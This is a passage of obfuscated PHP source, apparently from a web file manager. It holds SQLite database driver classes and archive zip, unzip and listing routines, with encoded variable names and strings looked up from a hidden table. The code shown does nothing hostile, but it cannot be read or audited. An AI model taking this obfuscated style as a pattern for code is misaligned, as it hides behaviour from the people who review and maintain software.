$this->in[$_SERVER[º·Ï‹¥³][9]]; if (count($´Åšòóá) <= $ßœÔËšÛ) { return array(); } $›Ü±íş¸ = array(); for ($ñÔçáœ = $ßœÔËšÛ; $ñÔçáœ < count($´Åšòóá); $ñÔçáœ += 2) { $›Ü±íş¸[$´Åšòóá[$ñÔçáœ]] = $´Åšòóá[$ñÔçáœ + 1]; $this->in[$´Åšòóá[$ñÔçáœ]] = $´Åšòóá[$ñÔçáœ + 1]; } return $›Ü±íş¸; } protected function assign($º«üè¾ı, $—µ‚èİâ) { $this->values[$º«üè¾ı] = $—µ‚èİâ; } protected function display($¨î¸·ê´) { ob_end_clean(); extract($this->values); require $this->tpl . $¨î¸·ê´; } } class DbSqliteBase extends Db { public function __construct($‘ËÚ„º = '') { $¡áœò„ =& $_SERVER[º·Ï‹¥³]; if (!extension_loaded($¡áœò„[13])) { think_exception(think_lang($¡áœò„[14]) . $¡áœò„[15]); } if (!empty($‘ËÚ„º)) { if (!isset($‘ËÚ„º[$¡áœò„[16]])) { $‘ËÚ„º[$¡áœò„[16]] = 438; } $this->config = $‘ËÚ„º; if (empty($this->config[$¡áœò„[17]])) { $this->config[$¡áœò„[17]] = array(); } } } public function connect($ö’§ÔÍ£ = '', $¹ˆ¤ÛÉ = 0) { $“İš¬¶“ =& $_SERVER[º·Ï‹¥³]; if (!isset($this->linkID[$¹ˆ¤ÛÉ])) { if (empty($ö’§ÔÍ£)) { $ö’§ÔÍ£ = $this->config; } $ÏÑÚ£± = !empty($ö’§ÔÍ£[$“İš¬¶“[17]][$“İš¬¶“[18]]) ? $ö’§ÔÍ£[$“İš¬¶“[17]][$“İš¬¶“[18]] : $this->pconnect; $×’ŞÙ¹ô = $ÏÑÚ£± ? $“İš¬¶“[19] : $“İš¬¶“[20]; $this->linkID[$¹ˆ¤ÛÉ] = $×’ŞÙ¹ô($ö’§ÔÍ£[$“İš¬¶“[21]], $ö’§ÔÍ£[$“İš¬¶“[16]]); if (!$this->linkID[$¹ˆ¤ÛÉ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¹ˆ¤ÛÉ], 30000); if (1 != think_config($“İš¬¶“[22])) { unset($this->config); } } return $this->linkID[$¹ˆ¤ÛÉ]; } public function free() { $this->queryID = null; } public function query($ñÇí­À) { $´»©Ó£œ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñÇí­À; if ($this->queryID) { $this->free(); } think_action_status($´»©Ó£œ[23], 1); think_status($´»©Ó£œ[24]); $this->queryID = sqlite_query($this->_linkID, $ñÇí­À); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $™”şÇÔÖ = $this->getAll(); return $™”şÇÔÖ; } } public function execute($ÛÖÑ¡‚ß) { $ö¹–´İ¨ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÖÑ¡‚ß; if ($this->queryID) { $this->free(); } think_action_status($ö¹–´İ¨[25], 1); think_status($ö¹–´İ¨[24]); $«•í”Ì = sqlite_exec($this->_linkID, $ÛÖÑ¡‚ß); $this->debug(); if (!1 === $«•í”Ì) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[º·Ï‹¥³][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…Á¸«„ô = sqlite_query($this->_linkID, $_SERVER[º·Ï‹¥³][27]); if (!$…Á¸«„ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯×²µ÷ = sqlite_query($this->_linkID, $_SERVER[º·Ï‹¥³][28]); if (!$¯×²µ÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ó¥Ì´ò‹ = array(); if ($this->numRows > 0) { for ($ËÆ·Âœœ = 0; $ËÆ·Âœœ < $this->numRows; $ËÆ·Âœœ++) { $Ó¥Ì´ò‹[$ËÆ·Âœœ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ó¥Ì´ò‹; } public function getFields($ñª›ù‘‚) { $œ¯Ó¸ÚË =& $_SERVER[º·Ï‹¥³]; $îáİî  = $this->query($œ¯Ó¸ÚË[29] . $ñª›ù‘‚ . $œ¯Ó¸ÚË[30]); $ŠŒÁ¦© = array(); if ($îáİî ) { foreach ($îáİî  as $¦¾Ğì“˜ => $öÇÓÚ‹) { $ŠŒÁ¦©[$öÇÓÚ‹[$œ¯Ó¸ÚË[31]]] = array($œ¯Ó¸ÚË[32] => $öÇÓÚ‹[$œ¯Ó¸ÚË[31]], $œ¯Ó¸ÚË[33] => $öÇÓÚ‹[$œ¯Ó¸ÚË[34]], $œ¯Ó¸ÚË[35] => (bool) ($öÇÓÚ‹[$œ¯Ó¸ÚË[36]] === $œ¯Ó¸ÚË[12]), $œ¯Ó¸ÚË[37] => $öÇÓÚ‹[$œ¯Ó¸ÚË[38]], $œ¯Ó¸ÚË[39] => strtolower($öÇÓÚ‹[$œ¯Ó¸ÚË[40]]) == $œ¯Ó¸ÚË[41], $œ¯Ó¸ÚË[42] => strtolower($öÇÓÚ‹[$œ¯Ó¸ÚË[43]]) == $œ¯Ó¸ÚË[44]); } } return $ŠŒÁ¦©; } public function getTables($¸Œ´²µ§ = '') { $¤¡­¦÷ã =& $_SERVER[º·Ï‹¥³]; $½¶íÃâ = $this->query($¤¡­¦÷ã[45] . $¤¡­¦÷ã[46] . $¤¡­¦÷ã[47]); $ò¹Òˆù = array(); foreach ($½¶íÃâ as $ô•éÅòï => $Ê™±Û) { $ò¹Òˆù[$ô•éÅòï] = current($Ê™±Û); } return $ò¹Òˆù; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ú¦Õç¦ =& $_SERVER[º·Ï‹¥³]; $Àö¸ÂÜ = sqlite_last_error($this->_linkID); $this->error = $Àö¸ÂÜ . $ú¦Õç¦[4] . sqlite_error_string($Àö¸ÂÜ); if ($ú¦Õç¦[12] != $this->queryStr) { $this->error .= LNG($ú¦Õç¦[48]) . $this->queryStr; } think_trace($this->error, $ú¦Õç¦[12], $ú¦Õç¦[49]); return $this->error; } public function escapeString($º¨›–³Ğ) { return sqlite_escape_string($º¨›–³Ğ); } public function parseLimit($æ€’¾œ) { $ÏÜ¥ËÎÅ =& $_SERVER[º·Ï‹¥³]; $Øºø§üª = $ÏÜ¥ËÎÅ[12]; if (!empty($æ€’¾œ)) { $æ€’¾œ = explode($ÏÜ¥ËÎÅ[50], $æ€’¾œ); if (count($æ€’¾œ) > 1) { $Øºø§üª .= $ÏÜ¥ËÎÅ[51] . $æ€’¾œ[1] . $ÏÜ¥ËÎÅ[52] . $æ€’¾œ[0] . $ÏÜ¥ËÎÅ[53]; } else { $Øºø§üª .= $ÏÜ¥ËÎÅ[51] . $æ€’¾œ[0] . $ÏÜ¥ËÎÅ[53]; } } return $Øºø§üª; } } class DbSqlite3Base extends Db { public function __construct($Ç” ƒÉ = '') { $–¤ÛØ¶Ë =& $_SERVER[º·Ï‹¥³]; if (!class_exists($–¤ÛØ¶Ë[54])) { think_exception(think_lang($–¤ÛØ¶Ë[14]) . $–¤ÛØ¶Ë[55]); } if (!empty($Ç” ƒÉ)) { if (!isset($Ç” ƒÉ[$–¤ÛØ¶Ë[16]])) { $Ç” ƒÉ[$–¤ÛØ¶Ë[16]] = 438; } $this->config = $Ç” ƒÉ; if (empty($this->config[$–¤ÛØ¶Ë[17]])) { $this->config[$–¤ÛØ¶Ë[17]] = array(); } } } public function connect($„´ğşî§ = '', $²š³®ÚØ = 0) { $Õ£ø®• =& $_SERVER[º·Ï‹¥³]; if (!isset($this->linkID[$²š³®ÚØ])) { if (empty($„´ğşî§)) { $„´ğşî§ = $this->config; } $this->linkID[$²š³®ÚØ] = new SQLite3($„´ğşî§[$Õ£ø®•[21]]); if (!$this->linkID[$²š³®ÚØ]) { think_exception($this->linkID[$²š³®ÚØ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$²š³®ÚØ]->busyTimeout(30000); if (1 != think_config($Õ£ø®•[22])) { unset($this->config); } } return $this->linkID[$²š³®ÚØ]; } public function free() { $this->queryID = null; } public function query($èªËêÎ) { $œõı‰²ò =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $èªËêÎ; if ($this->queryID) { $this->free(); } think_action_status($œõı‰²ò[23], 1); think_status($œõı‰²ò[24]); $this->queryID = $this->_linkID->query($èªËêÎ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $®à–™¤ = $this->getAll(); $this->numRows = count($®à–™¤); return $®à–™¤; } } public function execute($Ò¸ƒİ’·) { $œğ íÔî =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò¸ƒİ’·; if ($this->queryID) { $this->free(); } think_action_status($œğ íÔî[25], 1); think_status($œğ íÔî[24]); $„çÑ¹şß = $this->_linkID->exec($Ò¸ƒİ’·); $this->debug(); if (!1 === $„çÑ¹şß) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[º·Ï‹¥³][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Öğü›ñš = $this->_linkID->query($_SERVER[º·Ï‹¥³][27]); if (!$Öğü›ñš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $íÁş·ıı = $this->_linkID->query($_SERVER[º·Ï‹¥³][28]); if (!$íÁş·ıı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÛÆù­—Ñ = array(); while ($­è¬•µÈ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÛÆù­—Ñ[] = $­è¬•µÈ; } $this->queryID->reset(); return $ÛÆù­—Ñ; } public function getFields($Ÿìğ²ˆó) { $é©×í„² =& $_SERVER[º·Ï‹¥³]; $€ ÆõŒ = $this->query($é©×í„²[29] . $Ÿìğ²ˆó . $é©×í„²[30]); $´í¿¬Êå = array(); if ($€ ÆõŒ) { foreach ($€ ÆõŒ as $üÆ¼«³ => $¥ÒÌ–™‰) { $´í¿¬Êå[$¥ÒÌ–™‰[$é©×í„²[32]]] = array($é©×í„²[32] => $¥ÒÌ–™‰[$é©×í„²[32]], $é©×í„²[33] => $¥ÒÌ–™‰[$é©×í„²[33]], $é©×í„²[35] => (bool) ($¥ÒÌ–™‰[$é©×í„²[35]] === $é©×í„²[12]), $é©×í„²[37] => $¥ÒÌ–™‰[$é©×í„²[56]], $é©×í„²[39] => (bool) $¥ÒÌ–™‰[$é©×í„²[57]], $é©×í„²[42] => (bool) $¥ÒÌ–™‰[$é©×í„²[57]]); } } return $´í¿¬Êå; } public function getTables($¸ø¹°İû = '') { $ ø½ì²› =& $_SERVER[º·Ï‹¥³]; $Ë²°ºÂ = $this->query($ ø½ì²›[45] . $ ø½ì²›[46] . $ ø½ì²›[47]); $ÌµÑĞ¦® = array(); foreach ($Ë²°ºÂ as $ãüÇº‚˜ => $£ç¡¦Ú) { $ÌµÑĞ¦®[$ãüÇº‚˜] = current($£ç¡¦Ú); } return $ÌµÑĞ¦®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $—ÈÙıÒ =& $_SERVER[º·Ï‹¥³]; $this->error = $this->_linkID->lastErrorMsg(); if ($—ÈÙıÒ[12] != $this->queryStr) { $this->error .= LNG($—ÈÙıÒ[48]) . $this->queryStr; } think_trace($this->error, $—ÈÙıÒ[12], $—ÈÙıÒ[49]); return $this->error; } public function escapeString($‘ûÓá¿) { $Ï ú·åÉ =& $_SERVER[º·Ï‹¥³]; if ($this->_linkID) { return $this->_linkID->escapeString($‘ûÓá¿); } return str_ireplace($Ï ú·åÉ[58], $Ï ú·åÉ[59], $‘ûÓá¿); } public function parseLimit($ ïÒ†Ù¿) { $“ë’ğÕş =& $_SERVER[º·Ï‹¥³]; $µŞÊƒÒ¡ = $“ë’ğÕş[12]; if (!empty($ ïÒ†Ù¿)) { $ ïÒ†Ù¿ = explode($“ë’ğÕş[50], $ ïÒ†Ù¿); if (count($ ïÒ†Ù¿) > 1) { $µŞÊƒÒ¡ .= $“ë’ğÕş[51] . $ ïÒ†Ù¿[1] . $“ë’ğÕş[52] . $ ïÒ†Ù¿[0] . $“ë’ğÕş[53]; } else { $µŞÊƒÒ¡ .= $“ë’ğÕş[51] . $ ïÒ†Ù¿[0] . $“ë’ğÕş[53]; } } return $µŞÊƒÒ¡; } } goto EŒôïàøŠ; d—À‡Õ¬İ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‡ëËíæô; if ($‡ëËíæô) { return $‡ëËíæô; } $Ô¹¶¹²Ë = IO::init($_SERVER[º·Ï‹¥³][8]); return $Ô¹¶¹²Ë; } private static function iconvSystem($ÕŸ§÷Ù¤) { return self::local()->iconvSystem($ÕŸ§÷Ù¤); } private static function iconvApp($¶øéÒƒš) { return self::local()->iconvApp($¶øéÒƒš); } public static function zipFolder($µı•”…‘, $›ˆ›Å = "\x7a\151\x70", $ ï­º³Ó = '', $Î¿ëÓÁÈ = REPEAT_RENAME) { $º¾·¥áû =& $_SERVER[º·Ï‹¥³]; $è¨Ãæöõ = IO::listPath($µı•”…‘); if (!$è¨Ãæöõ) { return !1; } $è¨Ãæöõ = array_merge($è¨Ãæöõ[$º¾·¥áû[85]], $è¨Ãæöõ[$º¾·¥áû[86]]); return self::zip($è¨Ãæöõ, $›ˆ›Å, $ ï­º³Ó, $Î¿ëÓÁÈ); } public static function zip($åùÉ¨´à, $‚©²ûşÛ = "\x7a\x69\x70", $ùÏçôÒ¨ = '', $Ñ´ˆ¬º« = REPEAT_RENAME) { $àÌÉ«„ß =& $_SERVER[º·Ï‹¥³]; if (is_string($åùÉ¨´à) && $åùÉ¨´à) { $åùÉ¨´à = array(array($àÌÉ«„ß[87] => $åùÉ¨´à)); } $·‚ï­·² = self::init($åùÉ¨´à[0][$àÌÉ«„ß[87]]); $ƒÎ‘°ï– = self::info($åùÉ¨´à[0][$àÌÉ«„ß[87]]); $šÕó”Ñ = $àÌÉ«„ß[12]; $§…îşâí = $àÌÉ«„ß[12]; $ö²Çµ¢ = $àÌÉ«„ß[12]; if ($ùÏçôÒ¨ && substr($ùÏçôÒ¨, -1, 1) != $àÌÉ«„ß[8]) { $§…îşâí = get_path_father($ùÏçôÒ¨); $ö²Çµ¢ = get_path_this($ùÏçôÒ¨); } else { $§…îşâí = self::pathFather($ƒÎ‘°ï–[$àÌÉ«„ß[87]]); $ö²Çµ¢ = $ƒÎ‘°ï–[$àÌÉ«„ß[32]] . $àÌÉ«„ß[10] . $‚©²ûşÛ; if (count($åùÉ¨´à) > 1) { $ü÷ãú¾¦ = IO::info($§…îşâí); $ö²Çµ¢ = $ü÷ãú¾¦[$àÌÉ«„ß[32]] . $àÌÉ«„ß[10] . $‚©²ûşÛ; } if ($ùÏçôÒ¨) { $§…îşâí = $ùÏçôÒ¨; } } if ($·‚ï­·²->getType() == $àÌÉ«„ß[109]) { $Ù•÷•ÚÜ = self::init($§…îşâí); $•÷–Ü•Ÿ = $Ù•÷•ÚÜ->getType() == $àÌÉ«„ß[109] ? $§…îşâí : get_path_father($·‚ï­·²->path); $•÷–Ü•Ÿ = rtrim($•÷–Ü•Ÿ, $àÌÉ«„ß[8]) . $àÌÉ«„ß[8]; mk_dir($•÷–Ü•Ÿ); } else { $šÕó”Ñ = TEMP_FILES . $àÌÉ«„ß[1236] . time() . rand_string(8) . $àÌÉ«„ß[8]; mk_dir($šÕó”Ñ); file_put_contents($šÕó”Ñ . $àÌÉ«„ß[1237], $àÌÉ«„ß[12]); $•÷–Ü•Ÿ = $šÕó”Ñ; } $ã£§Ó§Ë = IO::info($•÷–Ü•Ÿ); if (!$ã£§Ó§Ë || !$ã£§Ó§Ë[$àÌÉ«„ß[224]]) { show_json(LNG($àÌÉ«„ß[1238]), !1); } $íÊÕ¿ñ« = self::zipFileList($åùÉ¨´à, $šÕó”Ñ); foreach ($íÊÕ¿ñ« as $²Ó¤î¾ => $‹ÁşĞŒ) { $íÊÕ¿ñ«[$²Ó¤î¾] = self::iconvSystem($‹ÁşĞŒ); } $¯‰Ãã¹Ò = get_filename_auto($•÷–Ü•Ÿ . $ö²Çµ¢, $àÌÉ«„ß[12], $Ñ´ˆ¬º«); KodArchive::create(self::iconvSystem($¯‰Ãã¹Ò), $íÊÕ¿ñ«); if (!IO::exist($¯‰Ãã¹Ò)) { if ($šÕó”Ñ) { del_dir($šÕó”Ñ); } show_json(LNG($àÌÉ«„ß[1239]), !1); } if (!$šÕó”Ñ) { return $¯‰Ãã¹Ò; } $€ìÄŒ¥’ = self::move($¯‰Ãã¹Ò, $§…îşâí, $Ñ´ˆ¬º«); if ($šÕó”Ñ) { del_dir($šÕó”Ñ); } if (!$¯‰Ãã¹Ò) { show_json(LNG($àÌÉ«„ß[1239]), !1); } return $€ìÄŒ¥’; } public static function unzip($Å€Ñ¼æİ, $õìí–Ê, $Åâë›É = "\55\61", $•÷¸Óò˜ = "\162\145\x70\154\x61\x63\x65") { $úŠª¯ó =& $_SERVER[º·Ï‹¥³]; $¸î°­®Ç = parent::info($Å€Ñ¼æİ); if (!$¸î°­®Ç) { show_json(LNG($úŠª¯ó[1240]), !1); } $öÔ ´í¤ = IO::infoFullSimple($õìí–Ê); if (!$öÔ ´í¤) { $õìí–Ê = IO::mkdir($õìí–Ê); } if (isset($öÔ ´í¤[$úŠª¯ó[184]]) && trim($öÔ ´í¤[$úŠª¯ó[87]], $úŠª¯ó[8]) != trim($õìí–Ê, $úŠª¯ó[8])) { $ÒòÜ”ÖÓ = KodIO::make($öÔ ´í¤[$úŠª¯ó[183]]); $­½Ë÷ìª = IO::fileNameAuto($ÒòÜ”ÖÓ, $öÔ ´í¤[$úŠª¯ó[32]], REPEAT_RENAME_FOLDER, !0); $õìí–Ê = IO::mkdir($ÒòÜ”ÖÓ . $­½Ë÷ìª); } $Åâë›É = $Åâë›É && $Åâë›É != $úŠª¯ó[1241] ? @json_decode($Åâë›É, !0) : -1; $¿ïÒÛ‹· = self::unzipPart($Å€Ñ¼æİ, $Åâë›É); if (!$¿ïÒÛ‹· || !IO::exist($¿ïÒÛ‹·[$úŠª¯ó[221]])) { show_json(LNG($úŠª¯ó[108]), !1); } $†ËšöÀ² = $¿ïÒÛ‹·[$úŠª¯ó[1242]][count($¿ïÒÛ‹·[$úŠª¯ó[1242]]) - 1]; if ($†ËšöÀ²[$úŠª¯ó[1243]] == -1 || substr($†ËšöÀ²[$úŠª¯ó[32]], -1, 1) == $úŠª¯ó[8]) { $š­çĞ¯Â = $¿ïÒÛ‹·[$úŠª¯ó[1244]] . rand_string(10) . $úŠª¯ó[8]; mk_dir($š­çĞ¯Â); $øÍèĞ€ß = count($¿ïÒÛ‹·[$úŠª¯ó[1242]]) == 1 ? IO::ext($Å€Ñ¼æİ) : get_path_ext($¿ïÒÛ‹·[$úŠª¯ó[221]]); $Ï¼‹è = KodArchive::extract(self::iconvSystem($¿ïÒÛ‹·[$úŠª¯ó[221]]), $š­çĞ¯Â, $†ËšöÀ²[$úŠª¯ó[1243]], $­½Ë÷ìª, $øÍèĞ€ß); self::unzipErrorCheck($Ï¼‹è, array($úŠª¯ó[1245], $Å€Ñ¼æİ, $øÍèĞ€ß, $õìí–Ê, $¿ïÒÛ‹·)); Hook::trigger($úŠª¯ó[1246], $š­çĞ¯Â); recursion_dir($š­çĞ¯Â, $åÛ¸… ¦, $×î³¥‡„, 0); $Ø‡‰ë—« = array_merge($åÛ¸… ¦, $×î³¥‡„); $ˆ¬‘ÎÕÃ = array(); foreach ($Ø‡‰ë—« as $ÎşùÁ´¸) { $¸Ó‡­Ë = IO::move(self::iconvApp($ÎşùÁ´¸), $õìí–Ê, $•÷¸Óò˜); if ($¸Ó‡­Ë) { $ˆ¬‘ÎÕÃ[] = $¸Ó‡­Ë; } } del_dir($š­çĞ¯Â); } else { $¸Ó‡­Ë = IO::move($¿ïÒÛ‹·[$úŠª¯ó[221]], $õìí–Ê, $•÷¸Óò˜, get_path_this($†ËšöÀ²[$úŠª¯ó[32]])); if ($¸Ó‡­Ë) { $ˆ¬‘ÎÕÃ[] = $¸Ó‡­Ë; } } return $ˆ¬‘ÎÕÃ ? $ˆ¬‘ÎÕÃ : !1; } public static function unzipList($„–Ú½íç) { $Ö»µ´ =& $_SERVER[º·Ï‹¥³]; $Çå“Ö«õ = isset($„–Ú½íç[$Ö»µ´[1247]]) ? $„–Ú½íç[$Ö»µ´[1247]] : !1; $³÷ÕÏ¸¯ = isset($„–Ú½íç[$Ö»µ´[1243]]) ? @json_decode($„–Ú½íç[$Ö»µ´[1243]], !0) : -1; $º­‹€á® = self::unzipPart($„–Ú½íç[$Ö»µ´[87]], $³÷ÕÏ¸¯); if (!$º­‹€á® || !IO::exist($º­‹€á®[$Ö»µ´[221]])) { show_json(LNG($Ö»µ´[108]), !1); } $ß¿Ö÷Îâ = $º­‹€á®[$Ö»µ´[1242]][count($º­‹€á®[$Ö»µ´[1242]]) - 1]; $‘Ñèğé = in_array(IO::ext($º­‹€á®[$Ö»µ´[221]]), array($Ö»µ´[364], $Ö»µ´[1248], $Ö»µ´[1249], $Ö»µ´[1250], $Ö»µ´[1251], $Ö»µ´[1252])); if (!$Çå“Ö«õ && ($ß¿Ö÷Îâ[$Ö»µ´[1243]] == -1 || $‘Ñèğé)) { $ó®Ë§çÏ = $º­‹€á®[$Ö»µ´[1244]] . get_path_this($º­‹€á®[$Ö»µ´[221]]) . $Ö»µ´[1253]; if (!IO::exist($ó®Ë§çÏ)) { $€äïÎ„ = $ß¿Ö÷Îâ[$Ö»µ´[1243]] == -1 ? get_path_ext(IO::pathThis($„–Ú½íç[$Ö»µ´[87]])) : get_path_ext($º­‹€á®[$Ö»µ´[221]]); $÷¥Óİı… = KodArchive::listContent(self::iconvSystem($º­‹€á®[$Ö»µ´[221]]), !0, $€äïÎ„); self::unzipErrorCheck($÷¥Óİı…, array($Ö»µ´[1254], $„–Ú½íç, $º­‹€á®)); @file_put_contents($ó®Ë§çÏ, json_encode($÷¥Óİı…[$Ö»µ´[1255]])); } return @json_decode(IO::getContent($ó®Ë§çÏ), !0); } IO::fileOut($º­‹€á®[$Ö»µ´[221]], $Çå“Ö«õ, get_path_this($ß¿Ö÷Îâ[$Ö»µ´[32]])); die; } private static function zipFileList($¦Î¼—¹ã, $ä®¬—İ = false) { $Õ‰›¢ä =& $_SERVER[º·Ï‹¥³]; $¡´“¾ª¬ = array(); foreach ($¦Î¼—¹ã as $„¾æ†ä) { $Ï™“´§Æ = $„¾æ†ä[$Õ‰›¢ä[87]]; if ($ä®¬—İ) { $Ï™“´§Æ = self::copy($„¾æ†ä[$Õ‰›¢ä[87]], $ä®¬—İ, $Õ‰›¢ä[869]); } else { $óˆßÚìİ = self::init($„¾æ†ä[$Õ‰›¢ä[87]]); if ($óˆßÚìİ->getType() == $Õ‰›¢ä[109]) { $Ï™“´§Æ = $óˆßÚìİ->path; } } if ($Ï™“´§Æ && self::local()->exist($Ï™“´§Æ)) { $¡´“¾ª¬[$„¾æ†ä[$Õ‰›¢ä[87]]] = $Ï™“´§Æ; } } if (!empty($¡´“¾ª¬)) { return array_values($¡´“¾ª¬); } show_json(LNG($Õ‰›¢ä[1217]), !1); } private static function localFilePath($¯Ç°áŸ) { $×Ğ¹­ùõ =& $_SERVER[º·Ï‹¥³]; $„ÕÓ¯úğ = KodIO::parse($¯Ç°áŸ); if ($„ÕÓ¯úğ[$×Ğ¹­ùõ[33]] == KodIO::KOD_SOURCE) { $©›İ×£ = Model($×Ğ¹­ùõ[876])->fileInfoGet(KodIO::sourceID($¯Ç°áŸ)); if (!$©›İ×£[$×Ğ¹­ùõ[87]]) { show_json($×Ğ¹­ùõ[1256], !1); } $¯Ç°áŸ = $©›İ×£[$×Ğ¹­ùõ[87]]; } $„Çş÷–Â = self::init($¯Ç°áŸ); if ($„Çş÷–Â->pathParse[$×Ğ¹­ùõ[1203]]) { $¯Ç°áŸ = $„Çş÷–Â->pathParse[$×Ğ¹­ùõ[1203]]; $„Çş÷–Â = self::init($¯Ç°áŸ); } $ö­†Á‚­ = $„Çş÷–Â->getType(); if ($ö­†Á‚­ == $×Ğ¹­ùõ[109] || $ö­†Á‚­ == $×Ğ¹­ùõ[1257]) { if (!$„Çş÷–Â->exist($„Çş÷–Â->path)) { show_json(LNG($×Ğ¹­ùõ[108]), !1); } return $„Çş÷–Â->path; } return !1; } public static function unzipPart($º¤º–Ì, $÷ŠÅš„Ë = -1) { $èøÜ¹Ì =& $_SERVER[º·Ï‹¥³]; $âÕóâ¦ = IO::pathThis($º¤º–Ì); if (!$÷ŠÅš„Ë || $÷ŠÅš„Ë == -1) { $®Ë—Ô£ğ = array(array($èøÜ¹Ì[32] => $âÕóâ¦, $èøÜ¹Ì[1243] => -1)); $®Ë—Ô£ğ[0][$èøÜ¹Ì[1258]] = $®Ë—Ô£ğ[0][$èøÜ¹Ì[32]]; } else { if (is_array($÷ŠÅš„Ë)) { $®Ë—Ô£ğ = $÷ŠÅš„Ë; $ƒ™ÚŠÒ = count($®Ë—Ô£ğ) - 1; for ($åòã–‘Ù = 0; $åòã–‘Ù <= $ƒ™ÚŠÒ; $åòã–‘Ù++) { $§ù¾èŸì = $®Ë—Ô£ğ[$åòã–‘Ù]; $ó¤§Ùåì = get_path_this($§ù¾èŸì[$èøÜ¹Ì[32]]) . (checkExtSafe($§ù¾èŸì[$èøÜ¹Ì[32]]) ? $èøÜ¹Ì[12] : $èøÜ¹Ì[1259]); $®Ë—Ô£ğ[$åòã–‘Ù][$èøÜ¹Ì[1258]] = $èøÜ¹Ì[1260] . intval($§ù¾èŸì[$èøÜ¹Ì[1243]]) . $èøÜ¹Ì[446] . $ó¤§Ùåì; if ($åòã–‘Ù == 0) { continue; } $®Ë—Ô£ğ[$åòã–‘Ù][$èøÜ¹Ì[1258]] = $®Ë—Ô£ğ[$åòã–‘Ù - 1][$èøÜ¹Ì[1258]] . $èøÜ¹Ì[1261] . $®Ë—Ô£ğ[$åòã–‘Ù][$èøÜ¹Ì[1258]]; } } } if (!is_array($®Ë—Ô£ğ) || count($®Ë—Ô£ğ) == 0) { return !1; } $ººÌÖ­© = $®Ë—Ô£ğ[count($®Ë—Ô£ğ) - 1]; if (!IO::exist($º¤º–Ì)) { return !1; } $óûŒì™ó = TEMP_FILES . $èøÜ¹Ì[1262] . kodIO::hashPathSafe($º¤º–Ì) . $èøÜ¹Ì[8]; $ÛíÂ õß = $óûŒì™ó . $ººÌÖ­©[$èøÜ¹Ì[1258]]; mk_dir($óûŒì™ó); file_put_contents(TEMP_FILES . $èøÜ¹Ì[1237], $èøÜ¹Ì[12]); if (IO::exist($ÛíÂ õß)) { return array($èøÜ¹Ì[221] => $ÛíÂ õß, $èøÜ¹Ì[1242] => $®Ë—Ô£ğ, $èøÜ¹Ì[1244] => $óûŒì™ó); } $Ñ§Ú«è‹ = self::localFilePath($º¤º–Ì); if (!$Ñ§Ú«è‹) { $Ñ§Ú«è‹ = $óûŒì™ó . $èøÜ¹Ì[1263]; if (!IO::exist($Ñ§Ú«è‹)) { self::copy($º¤º–Ì, $óûŒì™ó, !1, get_path_this($Ñ§Ú«è‹)); } } if (!$Ñ§Ú«è‹ || !IO::exist($Ñ§Ú«è‹)) { return !1; } if ($ººÌÖ­©[$èøÜ¹Ì[1243]] == -1) { return array($èøÜ¹Ì[221] => $Ñ§Ú«è‹, $èøÜ¹Ì[1242] => $®Ë—Ô£ğ, $èøÜ¹Ì[1244] => $óûŒì™ó); } $Ú·ÌÈ¹ó = $Ñ§Ú«è‹; foreach ($®Ë—Ô£ğ as $åòã–‘Ù => $§ù¾èŸì) { if (!$§ù¾èŸì || $§ù¾èŸì[$èøÜ¹Ì[1243]] == $èøÜ¹Ì[1241]) { break; } if (substr($§ù¾èŸì[$èøÜ¹Ì[32]], -1, 1) == $èøÜ¹Ì[8]) { break; } $¯»¯¬è„ = in_array(get_path_ext($§ù¾èŸì[$èøÜ¹Ì[1258]]), array($èøÜ¹Ì[364], $èøÜ¹Ì[1248], $èøÜ¹Ì[1249], $èøÜ¹Ì[1250], $èøÜ¹Ì[1251], $èøÜ¹Ì[1252])); $…Á÷Ú = $åòã–‘Ù == count($®Ë—Ô£ğ) - 1 && $¯»¯¬è„; $¨„ÜÉî = $óûŒì™ó . $§ù¾èŸì[$èøÜ¹Ì[1258]]; $Ÿî€éô¤ = $óûŒì™ó . get_path_this($§ù¾èŸì[$èøÜ¹Ì[32]]); if (IO::exist($¨„ÜÉî)) { $Ú·ÌÈ¹ó = $¨„ÜÉî; continue; } $‡š¶–°ö = $åòã–‘Ù == 0 ? get_path_ext($âÕóâ¦) : get_path_ext($Ú·ÌÈ¹ó); $ÙË‰ôğÂ = KodArchive::extract(self::iconvSystem($Ú·ÌÈ¹ó), $óûŒì™ó, $§ù¾èŸì[$èøÜ¹Ì[1243]], $íÔú¨ŞÃ, $‡š¶–°ö); 